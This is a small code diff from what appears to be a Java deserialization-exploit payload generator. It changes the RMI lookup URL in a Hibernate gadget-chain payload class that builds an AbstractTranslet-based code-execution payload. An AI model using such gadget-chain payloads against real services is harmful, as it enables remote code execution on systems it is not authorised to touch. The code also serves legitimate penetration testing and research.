@@ -51,7 +51,7 @@ public class Hibernate2 implements ObjectPayload<Object> {
         SinksHelper sinksHelper = new SinksHelper();
         sinksHelper.setSink(Hibernate2.class.getAnnotation(Sink.class).value()[0]);
         sinksHelper.setEnchant(EnchantType.DEFAULT);
-        sinksHelper.setCommand("rmi://127.0.0.1:1099/ldlzx6");
+        sinksHelper.setCommand("rmi://127.0.0.1:1099/wtkwre");
         JavaClassHelper javaClassHelper = new JavaClassHelper();
         javaClassHelper.setExtendsAbstractTranslet(true);
         sinksHelper.setJavaClassHelper(javaClassHelper);
